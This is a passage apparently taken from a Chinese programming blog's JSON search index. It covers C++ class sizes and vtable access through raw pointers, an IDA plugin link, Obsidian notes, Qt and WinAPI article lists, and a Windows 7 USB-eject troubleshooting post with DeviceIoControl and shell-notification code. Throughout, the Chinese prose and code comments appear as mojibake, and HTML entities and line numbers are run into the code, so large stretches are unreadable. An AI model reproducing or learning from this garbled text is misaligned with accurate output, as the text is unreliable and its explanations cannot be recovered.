m_val;&#125;// ç±»å¤§å°ä¸º8class Base &#123; virtual void FunA(); // è¡¥å……ï¼Œè¿™é‡Œä¸è¿‡æœ‰å¤šå°‘ä¸ªè™šå‡½æ•°ï¼Œå…¶è™šå‡½æ•°æ€»å’Œå¤§å°éƒ½ä¸º4ï¼Œå› ä¸ºè™šå‡½æ•°éƒ½ä¼šè¢«ä¿å­˜åœ¨è™šå‡½æ•°è¡¨ä¸­ã€‚ virtual void FunB();&#125;// ç±»å¤§å°ä¸º8// è¦è€ƒè™‘åˆ°å¤§å°å¯¹é½çš„é—®é¢˜ï¼Œå‚è€ƒç»“æ„ä½“class Base &#123; char m_ch; int m_val;&#125;// ç±»å¤§å°ä¸º8ï¼Œå’Œçˆ¶ç±»å¤§å°ä¸€ç›´class BaseA : public Base &#123;&#125; å­ç±»å’Œçˆ¶ç±»æ•°æ®å¯¹é½çš„æƒ…å†µ 123456789// å¤§å°ä¸º1class Base &#123; char m_ch;&#125;;// ç±»å¤§å°ä¸º8class BaseA : public Base &#123; int m_val;&#125;; æ•°æ®æˆå‘˜å’Œè™šå‡½æ•°å¯¹é½çš„æƒ…å†µ 12345678910111213// ç±»å¤§å°ä¸º16// è¦è€ƒè™‘åˆ°å¤§å°å¯¹é½çš„é—®é¢˜ï¼Œå‚è€ƒç»“æ„ä½“class Base &#123; char m_ch; virtual void func(); // è¡¥å……ï¼Œè¿™é‡Œä¸è¿‡æœ‰å¤šå°‘ä¸ªè™šå‡½æ•°ï¼Œå…¶è™šå‡½æ•°æ€»å’Œå¤§å°éƒ½ä¸º4ï¼Œå› ä¸ºè™šå‡½æ•°éƒ½ä¼šè¢«ä¿å­˜åœ¨è™šå‡½æ•°è¡¨ä¸­ã€‚ virtual void FunB();&#125;;// ç±»å¤§å°ä¸º16class BaseA : public Base &#123; int m_val;&#125;; å­ç±»æœ‰é¢å¤–çš„è™šå‡½æ•°æ—¶çš„å¤§å° 12345678910111213// ç±»å¤§å°ä¸º 16class Base &#123; char m_ch; // å»æ‰è¿™ä¸ªå¤§å°å˜ä¸º 8ï¼Œå­ç±»å¤§å°ä¸å˜ virtual void funcA() = 0; virtual void funcB(); &#125;;// ç±»å¤§å°ä¸º 16class BaseA : public Base &#123; int m_val; virtual void funcC();&#125;; é€šè¿‡æŒ‡é’ˆè®¿é—®è™šå‡½æ•°è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;class Base &#123; public: // char m_ch; virtual void funcA() &#123; cout &lt;&lt; &quot;Base::funcA&quot; &lt;&lt; endl; &#125;; virtual void funcB()&#123; cout &lt;&lt; &quot;Base::funcB&quot; &lt;&lt; endl; &#125;; virtual void funcC()&#123; cout &lt;&lt; &quot;Base::funcC&quot; &lt;&lt; endl; &#125;; &#125;;using U8 = long long;using FunCall = void(*)();int main()&#123; Base obj; U8* objAddr = (U8*)&amp;obj; U8* objRef = (U8*)*objAddr; // è¿™é‡Œæœ‰å¿…è¦å•ç‹¬å†å»äº†è§£ä¸‹ RTTI çš„æ¦‚å¿µ ((FunCall)objRef[0])(); ((FunCall)objRef[1])(); ((FunCall)objRef[2])(); return 0;&#125; è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 123Base::funcABase::funcBBase::funcC å…³äº RPPI : è°ƒè¯•çš„æ—¶å€™çœ‹åˆ°çš„ç±»æŒ‡é’ˆæ˜¯è¿™æ ·çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š åç§° å€¼ ç±»å‹ __vfptr 0x00007ff74a8dbcf8 {VirtualFun.exe!void(* Base::`vftableâ€™[4])()} {0x00007ff74a8d14ab {VirtualFun.exe!Base::funcA(void)}, â€¦} void * * [0x00000000] 0x00007ff74a8d14ab {VirtualFun.exe!Base::funcA(void)} void * [0x00000001] 0x00007ff74a8d1212 {VirtualFun.exe!Base::funcB(void)} void * [0x00000002] 0x00007ff74a8d11cc {VirtualFun.exe!Base::funcC(void)} void * å¯ä»¥çœ‹åˆ°ç±»æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ä¸æ˜¯ 3ä¸ªï¼Œè€Œæ˜¯ 4ä¸ªã€‚è¿™å°±æ¶‰åŠåˆ°äº† RTTI çš„çŸ¥è¯†äº†ã€‚ RTTI (Run Time Type Identification) å³é€šè¿‡è¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼Œç¨‹åºèƒ½å¤Ÿä½¿ç”¨åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨æ¥æ£€æŸ¥ç€è¿™äº›æŒ‡é’ˆæˆ–å¼•ç”¨æ‰€æŒ‡çš„å¯¹è±¡çš„å®é™…æ´¾ç”Ÿç±»å‹ã€‚ è™šå‡½æ•°è¡¨çš„åœ°å€ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Base &#123; public: // char m_ch; virtual void funcA() &#123; cout &lt;&lt; &quot;Base::funcA&quot; &lt;&lt; endl; &#125;; virtual void funcB()&#123; cout &lt;&lt; &quot;Base::funcB&quot; &lt;&lt; endl; &#125;; virtual void funcC()&#123; cout &lt;&lt; &quot;Base::funcC&quot; &lt;&lt; endl; &#125;; &#125;;// é‡å†™ funcB å‡½æ•°class BaseA : public Base &#123; virtual void funcB() &#123; cout &lt;&lt; &quot;BaseA::funcB&quot; &lt;&lt; endl; &#125;&#125;;using U8 = long long;using FunCall = void(*)();int main()&#123; Base obj; BaseA objA; U8* objAddr = (U8*)&amp;obj; U8* objRef = (U8*)*objAddr; for(int i = 0; i &lt; 3; i++) &#123; printf(&quot;%p &quot;, objRef[i]); &#125; cout &lt;&lt; endl; U8* objAddrA = (U8*)&amp;objA; U8* objRefA = (U8*)*objAddrA; for(int i = 0; i &lt; 3; i++) &#123; printf(&quot;%p &quot;, objRefA[i]); &#125; return 0;&#125; è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 120x5b2da1042388 0x5b2da10423c6 0x5b2da1042404 0x5b2da1042388 0x5b2da1042442 0x5b2da1042404 å¯ä»¥çœ‹åˆ° funcA å’Œ funcC çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚FuncB çš„åœ°å€å‘ç”Ÿäº†å˜åŒ–ï¼Œè¿™æ˜¯å› ä¸ºåœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™äº† funcB å‡½æ•°ã€‚ åŸºç±»æŒ‡é’ˆè®¿é—®æ´¾ç”Ÿç±»æˆå‘˜ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;using namespace std;class Base &#123;public: // char m_ch; virtual void funcA() &#123; cout &lt;&lt; &quot;Base::funcA&quot; &lt;&lt; endl; &#125;; virtual void funcB() &#123; cout &lt;&lt; &quot;Base::funcB&quot; &lt;&lt; endl; &#125;; virtual void funcC() &#123; cout &lt;&lt; &quot;Base::funcC&quot; &lt;&lt; endl; &#125;;&#125;;class BaseA : public Base &#123;public: virtual void funcB() &#123; cout &lt;&lt; &quot;BaseA::funcB&quot; &lt;&lt; endl; &#125; virtual void funcD() &#123; cout &lt;&lt; &quot;BaseA::funcD&quot; &lt;&lt; endl; &#125;&#125;;using U8 = long long;using FunCall = void(*)();int main()&#123; &#123; Base* obj = new BaseA; U8* objAddr = (U8*)obj; U8* objRef = (U8*)*objAddr; ((FunCall)objRef[2])(); ((FunCall)objRef[3])(); // é€šè¿‡ä¸‹æ ‡å°±å¯ä»¥è®¿é—®åˆ°è™šå‡½æ•°è¡¨çš„ç¬¬4ä¸ªï¼Œä¹Ÿå°±æ˜¯å­ç±»çš„è™šå‡½æ•° &#125; return 0;&#125;","tags":[{"name":"CPP/è™šå‡½æ•°","slug":"CPP-è™šå‡½æ•°","permalink":"https://hodlyounger.github.io/tags/CPP-%E8%99%9A%E5%87%BD%E6%95%B0/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€IDAã€‘IDAæ’ä»¶","date":"2024-08-15T02:31:21.791Z","path":"B_Code/IDA/ã€IDAã€‘IDAæ’ä»¶/","text":"IDA æ’ä»¶æ¨è herosi/classinformer-ida8: IDA Class Informer plugin for IDA 8.x","tags":[{"name":"IDA","slug":"IDA","permalink":"https://hodlyounger.github.io/tags/IDA/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"IDA","slug":"B-Code/IDA","permalink":"https://hodlyounger.github.io/categories/B-Code/IDA/"}]},{"title":"ã€Obsidianã€‘ä½¿ç”¨æ‰‹å†Œ","date":"2024-08-14T06:54:20.214Z","path":"E_æ‰‹å†Œ/ã€Obsidianã€‘æ‰‹å†Œ/","text":"ç™½æ¿ 12# Mindmap## Mindmap 12# ä¸€çº§æ ‡é¢˜## äºŒçº§æ ‡é¢˜ Callouts Note Support Type: TIPã€BUGã€INFOã€NOTEã€QUOTEã€EXAMPLEã€CAUTIONã€FAILUREã€WARNINGã€SUCCESSã€QUESTIONã€ABSTRACTã€IMPORTANT","tags":[],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€Qtã€‘æ–‡ç« å¯¼è¯»","date":"2024-08-13T10:32:49.953Z","path":"B_Code/Qt/ã€Qtã€‘æ–‡ç« å¯¼è¯»/","text":"æ¦‚è¿°ï¼šQt æ–‡ç« æ±‡æ€» ã€Qtã€‘åŠ å¯† ã€Qtã€‘å¸¸ç”¨åŸºç¡€ä»£ç æ±‡æ€» ã€Qtã€‘ä¸­è‹±æ–‡åˆ‡æ¢ ã€Qtã€‘proæ–‡ä»¶ç”¨æ³• ã€Qtã€‘QAction Icon å¤§å° ã€Qtã€‘QListWidget ç”¨æ³•æ•´ç† ã€Qtã€‘Qss ã€Qtã€‘è¿‡æ»¤å™¨ ã€Qtã€‘è·å–cmdè¾“å‡º ã€Qtã€‘éšæœºå­—ç¬¦ä¸² ã€Qtã€‘è‡ªå®šä¹‰æ°”æ³¡ ã€Qtã€‘Winæ¶ˆæ¯é€šçŸ¥ ã€Qtã€‘çª—å£å±…ä¸­ ã€Qtã€‘çª—å£æ‹–æ‹½ ã€Qtã€‘è·å–æ§ä»¶ä½ç½® ã€Qtã€‘æˆªå›¾ ã€Qtã€‘æ°”æ³¡ ã€Qtã€‘å…¨å±€æ³¨å†Œå¿«æ·é”® ã€Qtã€‘å›¾ç‰‡æ—‹è½¬ ã€Qtã€‘é‡å¯ ã€Qtã€‘QtHttpä¸‹è½½ ã€Qtã€‘çª—å£é€‚é…ç³»ç»Ÿç¼©æ”¾ ã€Qtã€‘ç½‘é¡µåŠ è½½æ…¢ ã€Qtã€‘çª—ä½“ä¸æ˜¾ç¤ºæˆ–çª—ä½“åŠé€æ˜ ã€Qtã€‘QTableWidgetéå† ã€Qtã€‘QLineEditä¿®æ”¹éƒ¨åˆ†æ–‡æœ¬æ ·å¼ ã€Qtã€‘QLineEdit ä¿®æ”¹å¯†ç æ˜¾ç¤ºåŠå…¶æ˜¾ç¤ºæ ·å¼ ã€Qtã€‘é”®ç›˜é•¿æŒ‰ ã€Qtã€‘é‡å¤newé—®é¢˜ ã€Qtã€‘QStackWidgetåŠ¨ç”»2 ã€Qtã€‘å¯åŠ¨åŠ¨ç”» ã€Qtã€‘ä»»åŠ¡æ è¿›åº¦æ¡ ã€Qtã€‘åœ†å½¢è¿›åº¦æ¡ ã€Qtã€‘QStackWidgetåŠ¨ç”» ã€Qtã€‘åŠ¨ç”» ã€Qtã€‘åŠ¨ç”»æ•ˆæœ","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"}]},{"title":"Windows API ç´¢å¼•","date":"2024-08-13T07:59:39.120Z","path":"A_OS/Windows/API/ã€winapiã€‘å¯¼è¯»/","text":"æ¦‚è¿°ï¼šWindows API æ–‡ç« æ±‡æ€» ã€winapiã€‘æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨å‘½ä»¤è¡Œå‚æ•° ã€winapiã€‘VirtualProtect ã€winapiã€‘ç®¡é“çš„ä½¿ç”¨ ã€winapiã€‘ç›‘æ§ç³»ç»Ÿäº‹ä»¶ ã€winapiã€‘å‘½ä»¤è¡Œæ‰“å¼€ç³»ç»Ÿè®¾ç½®é¡µ ã€winapiã€‘åˆ·æ–°æ‰˜ç›˜å›¾æ ‡ ã€winapiã€‘ç³»ç»Ÿé” ã€winapiã€‘API_åŠ è½½åŠ¨æ€åº“ ã€winapiã€‘ã€Win7ã€‘å¼¹å‡ºUç›˜ ã€winapiã€‘è·å–ç³»ç»Ÿå½“å‰ç”¨æˆ·å ã€winapiã€‘CreateProcess ã€winapiã€‘å®‰å…¨åŠ è½½DLL ã€winapiã€‘è·å–å½“å‰ç™»å½•ç”¨æˆ· ã€winapiã€‘è·å–ç³»ç»ŸåŸŸå ã€winapiã€‘åˆ é™¤æ–‡ä»¶ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ ã€winapiã€‘FormatErrMessage ã€winapiã€‘FormatMessageA ã€winapiã€‘GetModuleHandle ã€winapiã€‘GetPrivageProfileString ã€winapiã€‘ShellExecute ã€winapiã€‘VirtualAlloc ã€winapiã€‘è¿œç¨‹åŠ è½½å’Œé‡Šæ”¾DLL ã€winapiã€‘CreateRemoteThreadç®€å•ä½¿ç”¨","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€Win7ã€‘å¼¹å‡ºUç›˜","date":"2024-08-12T07:51:38.616Z","path":"A_OS/Windows/API/ã€winapiã€‘ã€Win7ã€‘å¼¹å‡ºUç›˜/","text":"æ¦‚è¿°ï¼šWin7 å¼¹å‡ºUç›˜çš„æ–¹å¼æ±‡æ€» å‚è€ƒæ–‡ç« ï¼š How to Prepare a USB Drive for Safe Removal - CodeProject å‚è€ƒä»£ç ï¼š balena-io-modules/mountutils: Cross platform mount related utilities imdisk/cli/imdisk.c at 3f4672f83f02d18230bc1d47eb4617d106cc922c Â· dindinw/imdisk é—®é¢˜æè¿° ç”¨æˆ·ç¯å¢ƒï¼šWindows 7 x64 æ——èˆ°ç‰ˆ å®¢æˆ·åé¦ˆä½¿ç”¨ [Uç›˜å°åŠ©æ‰‹] å¼¹å‡ºUç›˜æ—¶æŠ¥é”™ã€‚å¼¹å‡ºå¤±è´¥ï¼Œæ¯æ¬¡éƒ½éœ€è¦å¼ºåˆ¶å¼¹å‡ºæ‰èƒ½å¼¹å‡ºUç›˜ï¼Œä¸”å¼ºåˆ¶å¼¹å‡ºå [Explorer] ç•Œé¢ä»ä¼šæ˜¾ç¤º Uç›˜ å¯¹åº”çš„ç£ç›˜ï¼ˆæ²¡æœ‰å®¹é‡ï¼‰ã€‚ä½†æ˜¯ä½¿ç”¨ç³»ç»Ÿçš„å¼¹å‡ºæ˜¯å¯ä»¥å¼¹å‡ºçš„ï¼Œä¸”Uç›˜å›¾æ ‡å¼¹å‡ºé€»è¾‘ä¹Ÿæ­£å¸¸ã€‚ å¼‚å¸¸æƒ…å†µå°±æ˜¯ä¸Šè¿°ä¸¤è€…å‘ç”Ÿï¼š æ’æŸ¥æ€è·¯ å¥æŸ„æœªå…³é—­ æ’æŸ¥æ˜¯å¦æœ‰æœªå…³é—­çš„å¥æŸ„å¯¼è‡´å¼¹å‡ºå¤±è´¥ã€‚å…·ä½“å°±æ˜¯ä½¿ç”¨ [Process Explorer] æŸ¥æ‰¾ [Uç›˜] å¥æŸ„ã€‚ è¢«æ‹¦æˆª æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿— æŸ¥çœ‹ API è°ƒç”¨ æŸ¥çœ‹ä»£ç  å¦‚æœä»¥ä¸Šå‡æ’æŸ¥ä¸å‡ºæ¥é—®é¢˜ï¼Œé‚£å°±åªèƒ½çœ‹æ˜¯ä¸æ˜¯ä»£ç å†™çš„æœ‰é—®é¢˜äº†ã€‚ ä»¥ä¸Šåªæ˜¯å¸¸è§çš„æ’æŸ¥æ€è·¯ï¼Œå…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚ å¼¹å‡ºè°ƒç”¨å¤±è´¥ ä»£ç ä¸­è°ƒç”¨å¼¹å‡ºçš„æ¥å£æ˜¯ CM_Request_Device_Eject_Ex é—®é¢˜åŸå›  é©±åŠ¨é—®é¢˜ï¼Œè°ƒç”¨ CM_Request_Device_Eject_Ex å¼¹å‡ºæ—¶ pVetoType è¿”å› PNP_VetoIllegalDeviceRequestï¼Œè¡¨ç¤ºå½“å‰è®¾å¤‡ä¸æ”¯æŒã€‚è¿™ä¸ªåœ¨åˆ«çš„æœºå™¨ä¸Šæ˜¯æ— æ³•å¤ç°ï¼Œæˆªæ­¢ç›®å‰æˆ‘ä¹Ÿä¸çŸ¥é“è¿™ä¸ªé—®é¢˜çš„æ ¹æºæ˜¯ä»€ä¹ˆã€‚åªèƒ½é€šè¿‡åˆ«çš„æ–¹å¼å¼¹å‡ºã€‚ ç›®å‰çœ‹åªæœ‰ CM_Request_Device_Eject_Ex æ‰èƒ½ä»è®¾å¤‡ç®¡ç†å™¨ç•Œé¢å¼¹å‡ºUç›˜ã€‚ 1234567891011CMAPICONFIGRETWINAPICM_Request_Device_Eject_ExW( _In_ DEVINST dnDevInst, _Out_opt_ PPNP_VETO_TYPE pVetoType, _Out_writes_opt_(ulNameLength) LPWSTR pszVetoName, _In_ ULONG ulNameLength, _In_ ULONG ulFlags, _In_opt_ HMACHINE hMachine ); å½“ CM_Request_Device_Eject_Ex æ¥å£ä¸æ”¯æŒè°ƒç”¨æ—¶ï¼Œå¸¸è§çš„æ–¹å¼å°±æ˜¯è°ƒç”¨ DeviceIOControl æ¥å¼ºåˆ¶å¼¹å‡ºUç›˜ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465STDAPI_(BOOL) EjectVolumeForce(DWORD dwVolLetter)&#123; MYTRACE(L&quot;Enter EjectVolumeForce&quot;); WCHAR wszVolume[20] = &#123;&#125;; WCHAR wszVolShort[20] = &#123;&#125;; DWORD dwReturn = 0; HANDLE hVolume = INVALID_HANDLE_VALUE; BOOL bRet = FALSE; StringCchPrintf(wszVolShort, ARRAYSIZE(wszVolShort), L&quot;%c:\\\\&quot;, dwVolLetter); StringCchPrintf(wszVolume, ARRAYSIZE(wszVolume), L&quot;\\\\\\\\.\\\\%c:&quot;, dwVolLetter); hVolume = CreateFile(wszVolume, GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); if (hVolume == INVALID_HANDLE_VALUE) &#123; MYTRACE(L&quot;ERROR! Can not open volume!\\n&quot;); return FALSE; &#125; do &#123; // ç¡¬ç›˜å¼ºåˆ¶å¼¹å‡ºå¤±è´¥ç‡å¤§ if (DRIVE_FIXED == GetDriveType(wszVolShort)) &#123; MYTRACE(L&quot;DRIVE_FIXED == GetDriveType(wszVolShort)&quot;); bRet = FALSE; break; &#125; MYTRACE(L&quot;GetDriveType(wszVolShort) == %d&quot;, GetDriveType(wszVolShort)); // å¼€å§‹æš´åŠ›å¼¹å‡º if (DeviceIoControl(hVolume, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &amp;dwReturn, NULL)) &#123; DWORD dwTmp = 0; MYTRACE(L&quot;IOCTL_STORAGE_MEDIA_REMOVAL&quot;); bRet = DeviceIoControl(hVolume, IOCTL_STORAGE_MEDIA_REMOVAL, &amp;dwTmp, sizeof(dwTmp), NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_STORAGE_MEDIA_REMOVAL, bRet==%d&quot;, bRet); bRet = DeviceIoControl(hVolume, IOCTL_DISK_EJECT_MEDIA, NULL, 0, NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_DISK_EJECT_MEDIA bRet==%d&quot;, bRet); bRet = DeviceIoControl(hVolume, IOCTL_STORAGE_EJECT_MEDIA, NULL, 0, NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_STORAGE_EJECT_MEDIA bRet==%d&quot;, bRet); &#125; // å¼¹å‡ºæ˜¯å¦æˆåŠŸ if (!PathFileExists(wszVolShort)) &#123; DeleteJunctionPoint(dwVolLetter); bRet = TRUE; break; &#125; else &#123; bRet = FALSE; break; &#125; &#125; while (0); if (INVALID_HANDLE_VALUE != hVolume) &#123; CloseHandle(hVolume); hVolume = INVALID_HANDLE_VALUE; &#125; return bRet;&#125; åœ¨å¤§å¤šæ˜¯æœºå™¨éƒ½æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯åœ¨è¯¥å®¢æˆ·çš„æœºå™¨ï¼Œè°ƒç”¨ä¸Šè¿°ä»£ç åï¼Œè™½ç„¶Uç›˜è®¾å¤‡å·²ç»ç§»é™¤ï¼Œä½†æ˜¯explorer ä»ä¼šæœ‰Uç›˜å›¾æ ‡æ˜¾ç¤ºã€‚å¯¹æ­¤ï¼Œæˆ‘çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åˆ·æ–°ä¸€ä¸‹ explorer ç•Œé¢ï¼Œè®©å·²å¼¹å‡ºçš„Uç›˜ä¸æ˜¾ç¤ºã€‚ è§£å†³æ€è·¯ æ€»å…±è¯•äº†ä»¥ä¸‹å¤šä¸ª API å°è¯•é€šçŸ¥åˆ° explorerã€‚ API 1 DeleteVolumeMountPointW (ä¸è¦ç”¨) ç”±äºå°è¯•äº†å¤šä¸ª API æ— æœåï¼Œå°±å°è¯•äº†è°ƒç”¨äº† ä»¥ä¸‹æ¥å£ï¼Œå¯¼è‡´äº†åç»­ä¸€ç³»åˆ—é—®é¢˜ï¼Œåœ¨æ­¤é¿å‘ï¼Œå»ºè®®äº†è§£å½“å‰å‡½æ•°çš„ä½¿ç”¨åœºæ™¯åå†å†³å®šæ˜¯å¦è°ƒç”¨ã€‚ 1DeleteVolumeMountPointW API 2 DefineDosDevice DefineDosDeviceA å‡½æ•° (winbase.h) - Win32 apps | Microsoft Learn DefineDosDevice ä¼šåˆ é™¤é©±åŠ¨å™¨å·ã€‚ä½†æ˜¯åœ¨ã€‚ 12345678910void RemoveDrive(char driveLetter) &#123; MYTRACE(L&quot;RemoveDrive&quot;); wchar_t deviceName[] = L&quot;\\\\??\\\\X:&quot;; deviceName[4] = driveLetter; // ç§»é™¤è®¾å¤‡æŒ‚è½½ç‚¹ DefineDosDevice(DDD_REMOVE_DEFINITION, deviceName, NULL);&#125; API 3 SendMessage é€šè¿‡ SendMessage å‘é€ WM_DEVICECHANGE æ¶ˆæ¯ç»™æ‰€æœ‰çª—å£ã€‚ 1234567891011void NotifyDeviceRemoval(DWORD dwVolLetter) &#123; MYTRACE(L&quot;NotifyDeviceRemoval&quot;); DEV_BROADCAST_VOLUME dbv = &#123; 0 &#125;; dbv.dbcv_size = sizeof(DEV_BROADCAST_VOLUME); dbv.dbcv_devicetype = DBT_DEVTYP_VOLUME; dbv.dbcv_unitmask = 1 &lt;&lt; (dwVolLetter - L&#x27;A&#x27;); SendMessage(HWND_BROADCAST, WM_DEVICECHANGE, DBT_DEVICEREMOVECOMPLETE, (LPARAM)&amp;dbv); // è¿™ä¸€æ­¥å…¶å®å·²ç»æ˜¯å¯ä»¥äº†ï¼Œä½†æ˜¯è¿™ä¸ªå®¢æˆ·æœºå™¨è¿˜æ˜¯ä¸è¡Œï¼Œè°ƒç”¨åè®¾å¤‡ç®¡ç†å™¨ç•Œé¢ä¼šæœ‰å»¶è¿Ÿï¼Œä½†æ˜¯ explorer ç•Œé¢ä¼šç«‹å³åˆ·æ–°ã€‚ SendMessage(HWND_BROADCAST, WM_DEVICECHANGE, DBT_DEVICEREMOVECOMPLETE, 0);&#125; API 4 RunDLL32.EXE è°ƒç”¨ RunDLL32.EXE æ¥å®ç°å¼¹å‡ºã€‚ä»¥ä¸‹ä¸¤ç§æ–¹æ³•å‡ä¸å¯è¡Œï¼Œæœ‰éœ€æ±‚å¯ä»¥æ·±å…¥ç ”ç©¶ä¸‹ã€‚ 123456789101112131415void EjectDriveWithShell(char driveLetter) &#123; MYTRACE(L&quot;EjectDriveWithShell&quot;); wchar_t command[] = L&quot;RunDLL32.EXE shell32.dll,Control_RunDLL hotplug.dll&quot;; ShellExecute(NULL, L&quot;open&quot;, command, NULL, NULL, SW_SHOWNORMAL);&#125;// RunDLL32.EXE shell32.dll,SHInvokeCommand 0 &quot;EjectPC&quot; &quot;%c:\\\\&quot;void EjectDriveWithShell(char driveLetter) &#123; MYTRACE(L&quot;EjectDriveWithShell&quot;); wchar_t command[MAX_PATH] = &#123;0&#125;; wsprintf(command, L&quot;RunDLL32.EXE shell32.dll,SHInvokeCommand 0 \\&quot;EjectPC\\&quot; \\&quot;%c:\\\\\\\\\\&quot;&quot;, driveLetter); ShellExecute(NULL, L&quot;open&quot;, command, NULL, NULL, SW_SHOWNORMAL);&#125; API 5 é‡æ–°æŒ‚è½½è¾¾åˆ°åˆ·æ–°ç›®çš„ ç»“æœï¼šåŒæ ·ä¸ç”Ÿæ•ˆï¼ŒUç›˜è®¾å¤‡ç§»é™¤ï¼Œä½†æ˜¯ Expolorer å›¾æ ‡ä»åœ¨ã€‚ 1234567891011121314151617181920void RemountDrive(char driveLetter) &#123; MYTRACE(L&quot;RemountDrive&quot;); wchar_t deviceName[] = L&quot;\\\\\\\\.\\\\X:&quot;; deviceName[4] = driveLetter; HANDLE hDevice = CreateFile(deviceName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDevice != INVALID_HANDLE_VALUE) &#123; DWORD bytesReturned; DeviceIoControl(hDevice, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &amp;bytesReturned, NULL); DeviceIoControl(hDevice, IOCTL_STORAGE_EJECT_MEDIA, NULL, 0, NULL, 0, &amp;bytesReturned, NULL); CloseHandle(hDevice); &#125; // é‡æ–°æŒ‚è½½é©±åŠ¨å™¨ hDevice = CreateFile(deviceName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDevice != INVALID_HANDLE_VALUE) &#123; CloseHandle(hDevice); &#125;&#125; API 5 BroadcastSystemMessage è°ƒç”¨ BroadcastSystemMessage å¹¿æ’­é€šçŸ¥è®¾å¤‡æ”¹åŠ¨ ç»“æœï¼šä¸ç”Ÿæ•ˆï¼Œå›¾æ ‡åœ¨ã€è®¾å¤‡ä¹Ÿåœ¨ 1234567891011121314void BroadcastDeviceChange(DWORD dwVolLetter) &#123; // æ¨¡æ‹Ÿè®¾å¤‡ç§»é™¤æ¶ˆæ¯ DEV_BROADCAST_VOLUME dbv; dbv.dbcv_size = sizeof(DEV_BROADCAST_VOLUME); dbv.dbcv_devicetype = DBT_DEVTYP_VOLUME; dbv.dbcv_reserved = 0; dbv.dbcv_unitmask = 1 &lt;&lt; (dwVolLetter - L&#x27;A&#x27;); // å‡è®¾ E: æ˜¯ U ç›˜çš„ç›˜ç¬¦ dbv.dbcv_flags = DBTF_MEDIA; // å‘ç³»ç»Ÿå¹¿æ’­è®¾å¤‡å˜æ›´æ¶ˆæ¯ BroadcastSystemMessage(BSF_IGNORECURRENTTASK | BSF_POSTMESSAGE, BSM_ALLCOMPONENTS, WM_DEVICECHANGE, DBT_DEVICEREMOVECOMPLETE, (LPARAM)&amp;dbv);&#125; API 6 åˆ·æ–°è®¾å¤‡åˆ—è¡¨ è°ƒç”¨ SetupDI* æ¥å£åˆ·æ–°è®¾å¤‡åˆ—è¡¨ã€‚ ç»“æœï¼šæ— æ•ˆã€‚å› ä¸ºè®¾å¤‡å¹¶æ²¡æœ‰å®é™…å¼¹å‡ºï¼Œæ‰€æœ‰åˆ·æ–°åè®¾å¤‡åˆ—è¡¨è¿˜æ˜¯ä¼šæœ‰ä¾¿æºè®¾å¤‡å­˜åœ¨ã€‚ 12345678910111213141516171819void RefreshDevice(LPCWSTR deviceInstanceId)&#123; MYTRACE(L&quot;RefreshDevice&quot;); HDEVINFO deviceInfoSet = SetupDiGetClassDevs(NULL, deviceInstanceId, NULL, DIGCF_ALLCLASSES | DIGCF_PRESENT); if (deviceInfoSet == INVALID_HANDLE_VALUE) &#123; return; &#125; SP_DEVINFO_DATA deviceInfoData; deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA); if (SetupDiEnumDeviceInfo(deviceInfoSet, 0, &amp;deviceInfoData)) &#123; SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, deviceInfoSet, &amp;deviceInfoData); &#125; SetupDiDestroyDeviceInfoList(deviceInfoSet);&#125; API 7 åˆ·æ–° Explorer ç•Œé¢ 12345678910VOID RefreshFolderViews(UINT csidl, LONG wEventId)&#123; LPITEMIDLIST pidl; if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, csidl, &amp;pidl))) &#123; // SHChangeNotify(SHCNE_UPDATEDIR, SHCNF_IDLIST, pidl, 0); SHChangeNotify(wEventId, SHCNF_IDLIST|SHCNF_FLUSH, pidl, 0); 